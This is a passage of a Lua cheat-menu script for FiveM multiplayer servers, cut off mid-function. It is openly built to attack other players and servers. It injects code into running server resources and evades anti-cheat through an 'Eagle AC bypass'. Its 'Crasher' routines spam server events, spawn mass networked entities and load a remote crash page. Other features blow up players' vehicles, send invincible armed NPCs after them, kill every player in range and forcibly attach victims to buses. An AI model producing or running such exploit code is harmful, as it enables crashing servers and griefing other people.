        local iter, id = FindFirstVehicle()
        if not id or id == 0 then
            EndFindVehicle(iter)
            return
        end
        
        local enum = {handle = iter, destructor = EndFindVehicle}
        setmetatable(enum, entityEnumerator)
        
        local next = true
        repeat
            coroutine.yield(id)
            next, id = FindNextVehicle(iter)
        until not next
        
        enum.destructor, enum.handle = nil, nil
        EndFindVehicle(iter)
    end)
end

-- Metatable للـ entity enumerator
entityEnumerator = {
    __gc = function(enum)
        if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
        end
    end
}
MachoMenuButton(PlayerSection, "Boom vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    if selectedPlayer and selectedPlayer ~= -1 then
        local targetPed = GetPlayerPed(selectedPlayer)
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)

                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)

                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[

                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

                            SetEntityVisible(playerPed, false, false)

                            TaskLeaveVehicle(targetPed, targetVehicle, 0)

                            SetPedMoveRateOverride(playerPed, 10.0)

                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)

                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)

                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)

                            Citizen.Wait(500)
                            keepHidden = false

                            ClearPedTasksImmediately(playerPed)

                            SetEntityAsMissionEntity(playerPed, true, true)

                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)

                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end

                            Citizen.Wait(100)

                            ClearPedTasksImmediately(playerPed)

                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)

                            SetEntityVisible(playerPed, false, false)

                            Citizen.Wait(100)

                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)

                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)

                            Citizen.Wait(100)

                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)

                            Citizen.Wait(600)

                            ClearPedTasks(playerPed)

                            SetEntityVisible(playerPed, true, false)

                            -- Explode target vehicle using ExplodeVehicle with all options set to false
                            if DoesEntityExist(targetVehicle) then
                                ExplodeVehicle(targetVehicle, false, false)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle and detonated")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)

MachoMenuText(PlayerSection,"Risky trolls")

MachoMenuButton(PlayerSection, "Spawn Attack NPC (!)", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local serverId = GetPlayerServerId(selectedPlayer)
    MachoMenuNotification("NPC System", "Spawning attack NPC on player ID: " .. serverId)
    
    -- Find available resource for injection
    local targetResource = nil
    local resourcePriority = {"any", "any", "any"}
    
    for _, resourceName in ipairs(resourcePriority) do
        if GetResourceState(resourceName) == "started" then
            targetResource = resourceName
            break
        end
    end
    
    if not targetResource then
        -- Fallback to any available resource
        local allResources = {}
        for i = 0, GetNumResources() - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and GetResourceState(resourceName) == "started" then
                targetResource = resourceName
                break
            end
        end
    end
    
    if not targetResource then
        MachoMenuNotification("Error", "No suitable resource found!")
        return
    end
    
    -- Spawn with resource injection
    MachoInjectResource(targetResource, string.format([[
        local npcModel = "g_m_y_ballasout_01"
        local weaponHash = GetHashKey("weapon_minigun")
        local playerPed = GetPlayerPed(GetPlayerFromServerId(%d))
        
        if not DoesEntityExist(playerPed) then
            TriggerEvent('chat:addMessage', { args = { '^1NPC System:', 'Target player not found!' } })
            return
        end
        
        local playerPos = GetEntityCoords(playerPed)
        
        RequestModel(npcModel)
        while not HasModelLoaded(npcModel) do
            Citizen.Wait(100)
        end
        
        -- Spawn single NPC
        local spawnX = playerPos.x + 3.0
        local spawnY = playerPos.y + 3.0
        local spawnZ = playerPos.z
        
        local npc = CreatePed(4, npcModel, spawnX, spawnY, spawnZ, 0.0, true, false)
        
        -- Make NPC immortal but can still ragdoll naturally
        SetEntityInvincible(npc, true)
        SetPedDiesWhenInjured(npc, false)
        
        -- Give minigun
        GiveWeaponToPed(npc, weaponHash, 9999, false, true)
        SetCurrentPedWeapon(npc, weaponHash, true)
        
        -- Combat settings focused on attacking
        SetPedCombatAttributes(npc, 5, true)
        SetPedCombatAttributes(npc, 46, true)
        SetPedCombatRange(npc, 2)
        SetPedCombatMovement(npc, 3)
        SetPedAccuracy(npc, 100)
        
        -- Attack target player
        TaskCombatPed(npc, playerPed, 0, 16)
        SetEntityAsNoLongerNeeded(npc)
        
        TriggerEvent('chat:addMessage', { args = { '^2NPC System:', 'Attack NPC spawned with minigun!' } })
    ]], serverId))
end)


local NitWitdestroyer = MachoMenuAddTab(MenuWindow, "Destroyer")
    local LLeftSectionWidth = (MenuSize.x - TabsBarWidth) * 0.99

    local NitWiroyer = MachoMenuGroup(NitWitdestroyer, "Main", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LLeftSectionWidth, MenuSize.y - 5)
-- Define the GetPlayersInArea function to find nearby players
---

MachoMenuButton(NitWiroyer, "Crasher v1", function()
    function GetPlayersInArea()
    local players = {}
    for _, player in ipairs(GetActivePlayers()) do
        local ped = GetPlayerPed(player)
        if DoesEntityExist(ped) and ped ~= PlayerPedId() then
            -- Check the distance to ensure they are rendered
            local playerCoords = GetEntityCoords(ped)
            local myCoords = GetEntityCoords(PlayerPedId())
            local distance = Vdist(myCoords.x, myCoords.y, myCoords.z, playerCoords.x, playerCoords.y, playerCoords.z)
            
            -- Change 200.0 to your desired distance
            if distance < 200.0 then
                table.insert(players, player)
            end
        end
    end
    return players
end

    -- 1. جلب جميع اللاعبين المرندرين وحفظ IDs
    local players = GetPlayersInArea() -- تابعك الخاص يرجع Ped أو Player Index
    local playerIDs = {}

    for _, playerId in ipairs(players) do
        local serverId = GetPlayerServerId(playerId)
        if serverId and serverId > 0 then
            table.insert(playerIDs, serverId)
        end
    end
    

    if #playerIDs > 0 then
        -- 2. فتح DUI من الرابط
        local dui = MachoCreateDui("https://wf-675.github.io/crashingo.gg/")
        MachoShowDui(dui)

        -- 3. 

        -- 4. حفظ موقع اللاعب الحالي ونقله لمكان مؤقت
        local ped = PlayerPedId()
        local originalCoords = GetEntityCoords(ped)
        SetEntityCoords(ped, 1500.0, -1500.0, 58.0, false, false, false, true)
        Wait(500)

        -- 5. تطبيق التريغر على كل اللاعبين المرندرين مع تأخير 10ms بين كل شخص
        for _, serverId in ipairs(playerIDs) do
            for _, triggerData in ipairs(foundTriggers.items) do
                -- التريغر الخاص بالسيرفر
                MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:KidnapPlayer", ' .. serverId .. ')')
                Wait(10) -- تأخير 10 مللي ثانية بين كل تريغر
            end
        end

        -- 6. الانتظار قبل الرجوع
        Wait(4000)

        -- 7. إعادة اللاعب لمكانه الأصلي
        SetEntityCoords(ped, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)

        -- 8. إخفاء وإغلاق DUI
        Wait(100)
        MachoDestroyDui(dui)

        MachoMenuNotification("Success", "All rendered players have been processed and you have been returned to your location.")
    else
        MachoMenuNotification("Error", "No players are currently rendered.")
    end
end)
MachoMenuButton(NitWiroyer, "Crasher v2", function()
    local targetResource = nil
    local resourcePriority = {"any", "any", "any"}
    local foundResources = {}
    
    for _, resourceName in ipairs(resourcePriority) do
        if GetResourceState(resourceName) == "started" then
            table.insert(foundResources, resourceName)
        end
    end
    
    if #foundResources > 0 then
        targetResource = foundResources[math.random(1, #foundResources)]
    else
        local allResources = {}
        for i = 0, GetNumResources() - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and GetResourceState(resourceName) == "started" then
                table.insert(allResources, resourceName)
            end
        end
        if #allResources > 0 then
            targetResource = allResources[math.random(1, #allResources)]
        else
            MachoMenuNotification("Crasher", "Failed - System error!")
            return
        end
    end
    
    MachoInjectResource(targetResource, [[
        local function getClosestPlayer()
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local closestPlayer = nil
            local closestDistance = 999999.0
            
            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= 0 and targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)
                    
                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end
            
            return closestPlayer, closestDistance
        end
        
        local function spawnInvisibleWadeBot(coords)
            local hash = GetHashKey("ig_wade")
            
            RequestModel(hash)
            while not HasModelLoaded(hash) do
                Wait(10)
            end
            
            local bot = CreatePed(4, hash, coords.x, coords.y, coords.z, math.random(0, 360), true, false)
            
            SetEntityVisible(bot, false, false)
            SetEntityAlpha(bot, 0, false)
            SetEntityCollision(bot, false, false)
            SetEntityInvincible(bot, true)
            FreezeEntityPosition(bot, true)
            SetBlockingOfNonTemporaryEvents(bot, true)
            SetPedAsNoLongerNeeded(bot)
            
            NetworkRegisterEntityAsNetworked(bot)
            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(bot), true)
            SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(bot), false)
            
            SetModelAsNoLongerNeeded(hash)
            
            return bot
        end
        
        local function executeWadeBotSpawn()
            local closestPlayer, distance = getClosestPlayer()
            
            if closestPlayer and distance < 100.0 then
                local targetPed = GetPlayerPed(closestPlayer)
                local targetCoords = GetEntityCoords(targetPed)
                
                for i = 1, 1400 do
                    local offsetX = math.random(-100, 100) / 10.0
                    local offsetY = math.random(-100, 100) / 10.0
                    local offsetZ = math.random(-20, 20) / 10.0
                    
                    local spawnCoords = vector3(
                        targetCoords.x + offsetX,
                        targetCoords.y + offsetY,
                        targetCoords.z + offsetZ
                    )
                    
                    CreateThread(function()
                        Wait(i * 50)
                        spawnInvisibleWadeBot(spawnCoords)
                    end)
                end
                
            else
            end
        end
        
        executeWadeBotSpawn()
        RegisterKeyMapping('wadebots', 'Spawn Wade Bots on Closest Player', 'keyboard', 'F10')
    ]])
    
    MachoMenuNotification("Crasher", "Operation completed successfully")
end)

MachoMenuButton(NitWiroyer, "Crasher v3", function()
MachoInjectResource("any", [[
local isARROWUpKeyPressed = false
local isSelectingPlayer = false
local selectedPlayer = -1
local outlineColor = {r = 0, g = 0, b = 0, a = 255} -- Color of the marker outline

-- Display notification for the selected player
local function SelectedByME(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(true, false)
end

-- Function to draw 3D text
function Draw3DText(x, y, z, text, r, g, b, a)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    if onScreen then
        SetTextScale(0.0, 0.35)
        SetTextFont(0)
        SetTextProportional(true)
        SetTextColour(r, g, b, a)
        SetTextOutline()
        SetTextEntry("STRING")
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

-- Check if a player is in the center of the screen
function IsPlayerAtScreenCenter(player)
    local ped = GetPlayerPed(player)
    local pedCoords = GetEntityCoords(ped)
    local onScreen, screenX, screenY = World3dToScreen2d(pedCoords.x, pedCoords.y, pedCoords.z)
    if onScreen then
        local centerX, centerY = 0.5, 0.5
        local tolerance = 0.05
        return math.abs(screenX - centerX) < tolerance and math.abs(screenY - centerY) < tolerance
    end
    return false
end

-- Draw a dot at the center of the screen
function DrawCenterDot()
    local centerX, centerY = 0.5, 0.5
    local dotSize = 0.02
    local textureDict = "mpmissionend"
    local textureName = "goldmedal"

    RequestStreamedTextureDict(textureDict, true)
    DrawSprite(textureDict, textureName, centerX, centerY, dotSize, dotSize, 0.0, 255, 0, 0, 255)
end

-- Main thread
Citizen.CreateThread(function()
    local Black = 0
    local Hat = 0

    while true do
        Citizen.Wait(0)

        isARROWUpKeyPressed = IsControlPressed(0, 172) -- ARROW UP key
        isSelectingPlayer = IsControlPressed(0, 19) -- Check if left ALT is pressed for selecting player

        if isSelectingPlayer then
            local players = GetActivePlayers()
            local closestPlayer = -1

            -- Loop through all active players
            for _, player in ipairs(players) do
                if IsPlayerAtScreenCenter(player) then
                    closestPlayer = player
                    break
                end
            end

            -- If a player is selected
            if closestPlayer ~= -1 then
                selectedPlayer = closestPlayer
            end
        end

        -- Continuously draw a marker on the selected player
        if selectedPlayer ~= -1 then
            local targetPed = GetPlayerPed(selectedPlayer)
            local targetCoords = GetEntityCoords(targetPed)

            -- Draw a marker on the selected player's position
            DrawMarker(
                1, -- Marker type (cylinder)
                targetCoords.x, targetCoords.y, targetCoords.z - 1.0, -- Position (at player's feet)
                0.0, 0.0, 0.0, -- Direction
                0.0, 0.0, 0.0, -- Rotation
                0.9, 0.9, 2.0, -- Scale of the marker
                outlineColor.r, outlineColor.g, outlineColor.b, outlineColor.a, -- Color (RGBA)
                false, false, 2, false, nil, nil, false -- Additional options
            )
        end

        -- Trigger an explosion if the ARROW UP key is pressed, but keep the marker on the selected player
        if isARROWUpKeyPressed and selectedPlayer ~= -1 then
            local targetPed = GetPlayerPed(selectedPlayer)
            local targetCoords = GetEntityCoords(targetPed)
            local targetServerId = GetPlayerServerId(selectedPlayer)

            if Black < 400 then
                -- Increase the counter
                Black = Black + 1

                TriggerServerEvent("hospital:server:RevivePlayer", targetServerId)
                Citizen.Wait(5) -- Short wait between triggers
            end

            if Hat < 400 then
                -- Increase the counter
                Hat = Hat + 1

                TriggerServerEvent("hospital:server:RevivePlayer", targetServerId)
                Citizen.Wait(5) -- Short wait between triggers
            end
        end

        -- Reset the counter if it has reached the limit (e.g., after a certain condition)
        -- You can implement your own condition for resetting this counter.
        if Black >= 400 then
            Black = 0 -- Reset the counter to allow usage again
            SelectedByME("You can Crash now..!!")
            print('You can Crash now..!!')
        end
        if Hat >= 400 then
            Hat = 0 
        end

        -- Draw the center dot on the screen for easier selection
        DrawCenterDot()
    end
end)
]])
end)

MachoMenuText(NitWiroyer,"bypass")



local spawnerEnabled = false
local selectedKey = 0
local objectName = "prop_dumpster_01a"
local fiveGuardDetected = false


CreateThread(function()
    while true do
        Wait(500) 
        print("========================================")
        print("            EAGLE AC BYPASS            ")
        print("           Scar Group on top            ")
        print("      Object Spawner | Undetectable    ")
        print("==============Scar Group================")
    end
end)


Citizen.CreateThread(function()
    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resource = GetResourceByFindIndex(i)
        local files = GetNumResourceMetadata(resource, 'client_script')
        for j = 0, files - 1 do
            local x = GetResourceMetadata(resource, 'client_script', j)
            if x ~= nil and string.find(x, "obfuscated") then
                fiveGuardDetected = true
                break
            end
        end
        if fiveGuardDetected then break end
    end
end)

-- Object Input Box
local ObjectInput = MachoMenuInputbox(NitWiroyer, "", "Enter object name")

-- Enable/Disable Checkbox  
MachoMenuCheckbox(NitWiroyer, "Object Spawn",
    function()
        local inputText = MachoMenuGetInputbox(ObjectInput)
        if inputText ~= "" then
            objectName = inputText
        end
        spawnerEnabled = true
        MachoMenuNotification("Eagle AC Bypass", "Activated Successfully")
    end,
    function()
        spawnerEnabled = false
    end
)

-- Keybind
MachoMenuKeybind(NitWiroyer, "Spawn Key", 0, function(key, toggle)
    selectedKey = key
end)

-- Camera Direction Function
function RotationToDirection(rotation)
    local adjustedRotation = {
        x = (math.pi / 180) * rotation.x,
        y = (math.pi / 180) * rotation.y,
        z = (math.pi / 180) * rotation.z
    }
    local direction = {
        x = -math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
        y = math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
        z = math.sin(adjustedRotation.x)
    }
    return direction
end

function SpawnBarrierAtTarget()
    local playerPed = PlayerPedId()
    local originalCoords = GetEntityCoords(playerPed)
    
    local cam = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    local camDirection = RotationToDirection(camRot)
    
    local rayEnd = {
        x = cam.x + (camDirection.x * 1000),
        y = cam.y + (camDirection.y * 1000),
        z = cam.z + (camDirection.z * 1000)
    }
    
    local raycast = StartShapeTestRay(cam.x, cam.y, cam.z, rayEnd.x, rayEnd.y, rayEnd.z, -1, playerPed, 0)
    local _, hit, hitCoords = GetShapeTestResult(raycast)
    
    local targetPoint = hit and hitCoords or rayEnd
    local newX = targetPoint.x
    local newY = targetPoint.y
    local newZ = targetPoint.z + 5.0
    
    if fiveGuardDetected then
        MachoInjectResource2(3, 'any', [[ TriggerEvent('Melix:SpawnBarrier', "MelixOnTopBar", "]] .. objectName .. [[") ]])
    else
        SetEntityCoordsNoOffset(playerPed, newX, newY, newZ, false, false, false)
        TriggerEvent('Melix:SpawnBarrier', "MelixOnTopBar", objectName)
        SetEntityCoordsNoOffset(playerPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
    end
end

-- Key Detection
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 and spawnerEnabled then
        SpawnBarrierAtTarget()
    end
end)


MachoMenuText(NitWiroyer,"Exploits")

MachoMenuCheckbox(NitWiroyer, "Lower Character 5m Animation", 
    function()
        enableLowerAnim = true
        CreateThread(function()
            while enableLowerAnim do
                local targetResource = nil
                if GetResourceState("any") == "started" then
                    targetResource = "any"
                end
                
                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local playerPed = PlayerPedId()
                        
                        RequestAnimDict("missheistdockssetup1ig_12@base")
                        while not HasAnimDictLoaded("missheistdockssetup1ig_12@base") do
                            Citizen.Wait(100)
                        end
                        
                        TaskPlayAnim(playerPed, "missheistdockssetup1ig_12@base", "base", 8.0, -8.0, -1, 1, 0.2, false, false, false)
                        
                        SetEntityAnimCurrentTime(playerPed, "missheistdockssetup1ig_12@base", "base", 0.05)
                    ]])
                end
                
                Wait(500)
            end
        end)
    end,
    function()
        enableLowerAnim = false
        local playerPed = PlayerPedId()
        ClearPedTasks(playerPed)
    end
)
MachoMenuCheckbox(NitWiroyer, "kill all (You must hold a Gun)", 
    function()
        enableDamageLoop = true
        CreateThread(function()
            while enableDamageLoop do
                local targetResource = nil
                local resourcePriority = {"any", "any", "any"}
                local foundResources = {}
                
                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                        local myPed = PlayerPedId()
                        local currentWeapon = GetSelectedPedWeapon(myPed)
                        
                        if currentWeapon and currentWeapon ~= GetHashKey("weapon_unarmed") then
                            local weaponDamage = GetWeaponDamage(currentWeapon, 0)
                            
                            SetWeaponRecoilShakeAmplitude(currentWeapon, 0.0)
                            SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                            
                            for _, playerId in ipairs(GetActivePlayers()) do
                                if playerId ~= PlayerId() then
                                    local targetPed = GetPlayerPed(playerId)
                                    if DoesEntityExist(targetPed) and not IsEntityDead(targetPed) then
                                        SetEntityInvincible(targetPed, false)
                                        SetEntityCanBeDamaged(targetPed, true)
                                        SetEntityProofs(targetPed, false, false, false, false, false, false, false, false)
                                        
                                        local headBone = GetPedBoneIndex(targetPed, 31086)
                                        local headCoords = GetWorldPositionOfEntityBone(targetPed, headBone)
                                        
                                        if headCoords.x == 0.0 and headCoords.y == 0.0 and headCoords.z == 0.0 then
                                            headCoords = GetEntityCoords(targetPed)
                                            headCoords = vector3(headCoords.x, headCoords.y, headCoords.z + 0.6)
                                        end
                                        
                                        local startCoords = vector3(headCoords.x + 1.5, headCoords.y, headCoords.z)
                                        
                                        ShootSingleBulletBetweenCoords(
                                            startCoords.x, startCoords.y, startCoords.z,
                                            headCoords.x, headCoords.y, headCoords.z,
                                            weaponDamage,
                                            true,
                                            currentWeapon,
                                            myPed,
                                            true,
                                            true,
                                            3000.0
                                        )
                                    end
                                end
                            end
                        end
                end
                
                Wait(100)
            end
        end)
    end,
    function()
        enableDamageLoop = false
    end
)
local busSpawnLoop = false
MachoMenuCheckbox(NitWiroyer, "Bus Spawn Loop", 
    function()
        busSpawnLoop = true
        MachoMenuNotification("Bus Spawn", "activated bro")
        Citizen.CreateThread(function()
            while busSpawnLoop do
                local success, result = pcall(function()
                    MachoInjectResource("any", [[
if not vehicles then vehicles = {} end
if not targetedPlayers then targetedPlayers = {} end

local function spawnVehicle(vtype, name, pos, user_id, autoSeat)
    local mhash = GetHashKey(name)
    RequestModel(mhash)
    
    local timeout = 0
    while not HasModelLoaded(mhash) and timeout < 8000 do
        Citizen.Wait(100)
        timeout = timeout + 100
    end
    
    if not HasModelLoaded(mhash) then
        return false
    end

    local x, y, z = table.unpack(pos or GetEntityCoords(PlayerPedId()))
    local heading = GetEntityHeading(PlayerPedId()) + math.random(-180, 180)
    
    local vehicle = CreateVehicle(mhash, x, y, z, heading, true, false)
    
    if DoesEntityExist(vehicle) then
        SetVehicleOnGroundProperly(vehicle)
        SetVehicleNumberPlateText(vehicle, "CHAOS" .. math.random(1,99))
        SetModelAsNoLongerNeeded(mhash)
        SetEntityInvincible(vehicle, true)
        SetVehicleBodyHealth(vehicle, 50000.0)
        SetVehicleEngineHealth(vehicle, 50000.0)
        SetVehicleUndriveable(vehicle, false)
        NetworkRegisterEntityAsNetworked(vehicle)
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(vehicle), false)
        
        -- ضمان التحكم في المركبة
        SetEntityAsMissionEntity(vehicle, true, true)
        NetworkRequestControlOfEntity(vehicle)
        
        if not vehicles[vtype] then vehicles[vtype] = {} end
        table.insert(vehicles[vtype], {vtype, name, vehicle})
        
        return vehicle
    else
        SetModelAsNoLongerNeeded(mhash)
        return false
    end
end

local function findTarget()
    local myPed = PlayerPedId()
    local myPos = GetEntityCoords(myPed)
    local bestTarget = nil
    local shortestDist = 999.0
    
    for playerIdx = 0, 255 do
        if NetworkIsPlayerActive(playerIdx) and playerIdx ~= PlayerId() then
            local theirPed = GetPlayerPed(playerIdx)
            if DoesEntityExist(theirPed) and not IsPedDeadOrDying(theirPed, true) then
                local theirPos = GetEntityCoords(theirPed)
                local dist = GetDistanceBetweenCoords(myPos.x, myPos.y, myPos.z, theirPos.x, theirPos.y, theirPos.z, true)
                
                if dist < 350.0 and dist < shortestDist and not targetedPlayers[playerIdx] then
                    bestTarget = theirPed
                    shortestDist = dist
                end
            end
        end
    end
    
    if not bestTarget then
        targetedPlayers = {}
        for playerIdx = 0, 255 do
            if NetworkIsPlayerActive(playerIdx) and playerIdx ~= PlayerId() then
                local theirPed = GetPlayerPed(playerIdx)
                if DoesEntityExist(theirPed) and not IsPedDeadOrDying(theirPed, true) then
                    local theirPos = GetEntityCoords(theirPed)
                    local dist = GetDistanceBetweenCoords(myPos.x, myPos.y, myPos.z, theirPos.x, theirPos.y, theirPos.z, true)
                    
                    if dist < 350.0 and dist < shortestDist then
                        bestTarget = theirPed
                        shortestDist = dist
                    end
                end
            end
        end
    end
    
    return bestTarget, shortestDist
end

local function chaosAttach(busEntity, preSelectedVictim)
    local victim = preSelectedVictim
    
    if victim and DoesEntityExist(victim) then
        
        for playerIdx = 0, 255 do
            if GetPlayerPed(playerIdx) == victim then
                targetedPlayers[playerIdx] = true
                break
            end
        end
        
        -- ضمان التحكم في الباص والضحية
        SetEntityAsMissionEntity(busEntity, true, true)
        SetEntityAsMissionEntity(victim, true, true)
        NetworkRequestControlOfEntity(busEntity)
        NetworkRequestControlOfEntity(victim)
        
        -- انتظار للحصول على التحكم في كلاهما
        local controlTimeout = 0
        while (not NetworkHasControlOfEntity(busEntity) or not NetworkHasControlOfEntity(victim)) and controlTimeout < 50 do
            Citizen.Wait(100)
            NetworkRequestControlOfEntity(busEntity)
            NetworkRequestControlOfEntity(victim)
            controlTimeout = controlTimeout + 1
        end
        
        -- تأكد من قوة الباص أولاً
        SetEntityHealth(busEntity, 50000)
        SetEntityMaxHealth(busEntity, 50000)
        SetVehicleBodyHealth(busEntity, 50000.0)
        SetVehicleEngineHealth(busEntity, 50000.0)
        SetVehiclePetrolTankHealth(busEntity, 50000.0)
        SetEntityInvincible(busEntity, true)
        SetVehicleStrong(busEntity, true)
        SetVehicleCanBreak(busEntity, false)
        SetEntityCanBeDamaged(busEntity, false)
        
        -- نقل الباص بجانب الضحية مباشرة قبل الربط
        local victimPos = GetEntityCoords(victim)
        SetEntityCoords(busEntity, victimPos.x + 2.0, victimPos.y + 2.0, victimPos.z, false, false, false, true)
        
        Citizen.Wait(500) -- انتظار للتأكد من الموقع
        
        -- مقاعد الباص الداخلية
        local interiorSpots = {
            {0.8, 1.2, -0.3, 0.0, 0.0, 0.0},      -- مقعد السائق
            {-0.8, 1.2, -0.3, 0.0, 0.0, 0.0},     -- مقعد الراكب الأمامي
            {0.8, 0.0, -0.3, 0.0, 0.0, 0.0},      -- مقعد خلفي يمين
            {-0.8, 0.0, -0.3, 0.0, 0.0, 0.0},     -- مقعد خلفي يسار
            {0.8, -1.2, -0.3, 0.0, 0.0, 0.0},     -- مقعد أكثر للخلف يمين
            {-0.8, -1.2, -0.3, 0.0, 0.0, 0.0},    -- مقعد أكثر للخلف يسار
            {0.0, -0.5, -0.3, 0.0, 0.0, 0.0},     -- وسط الباص
            {0.8, -2.0, -0.3, 0.0, 0.0, 0.0},     -- مؤخرة الباص يمين
            {-0.8, -2.0, -0.3, 0.0, 0.0, 0.0},    -- مؤخرة الباص يسار
            {0.0, 0.5, -0.2, 0.0, 0.0, 0.0},      -- قريب من المقدمة
            {0.0, -1.5, -0.2, 0.0, 0.0, 0.0}      -- قريب من المؤخرة
        }
        
        -- أول ربط للضحية
        local currentSpot = interiorSpots[math.random(#interiorSpots)]
        local attachSuccess = AttachEntityToEntity(victim, busEntity, 0, currentSpot[1], currentSpot[2], currentSpot[3], currentSpot[4], currentSpot[5], currentSpot[6], false, false, false, false, 2, true)
        
        -- الحفاظ على التحكم بعد الربط
        SetEntityAsMissionEntity(busEntity, true, true)
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(busEntity), false)
        
        if not attachSuccess then
            -- إذا فشل الربط، جرب طريقة مختلفة
            NetworkRequestControlOfEntity(busEntity)
            NetworkRequestControlOfEntity(victim)
            SetEntityCoords(victim, victimPos.x, victimPos.y, victimPos.z + 1.0, false, false, false, true)
            Citizen.Wait(200)
            AttachEntityToEntity(victim, busEntity, 0, 0.0, 0.0, -0.3, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
        end
        
        -- التأكد من الربط
        Citizen.Wait(300)
        if not IsEntityAttached(victim) then
            -- محاولة أخيرة للربط
            NetworkRequestControlOfEntity(busEntity)
            NetworkRequestControlOfEntity(victim)
            local busPos = GetEntityCoords(busEntity)
            SetEntityCoords(victim, busPos.x, busPos.y, busPos.z - 0.3, false, false, false, true)
            AttachEntityToEntity(victim, busEntity, 0, 0.0, 0.0, -0.3, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
            SetEntityAsMissionEntity(busEntity, true, true)
        end
        
        Citizen.CreateThread(function()
            local chaosCounter = 0
            local maxChaos = math.random(35, 55)
            
            while DoesEntityExist(busEntity) and DoesEntityExist(victim) and chaosCounter < maxChaos do
                Citizen.Wait(math.random(1200, 2200))
                chaosCounter = chaosCounter + 1
                
                if DoesEntityExist(victim) and DoesEntityExist(busEntity) then
                    -- طلب التحكم في الباص والضحية باستمرار
                    if not NetworkHasControlOfEntity(busEntity) then
                        NetworkRequestControlOfEntity(busEntity)
                        SetEntityAsMissionEntity(busEntity, true, true)
                    end
                    
                    if not NetworkHasControlOfEntity(victim) then
                        NetworkRequestControlOfEntity(victim)
                        SetEntityAsMissionEntity(victim, true, true)
                    end
                    
                    -- فصل مؤقت وإعادة ربط في مقعد جديد
                    if IsEntityAttached(victim) then
                        -- طلب التحكم قبل الفصل
                        NetworkRequestControlOfEntity(busEntity)
                        Citizen.Wait(50)
                        DetachEntity(victim, false, false)
                    end
                    
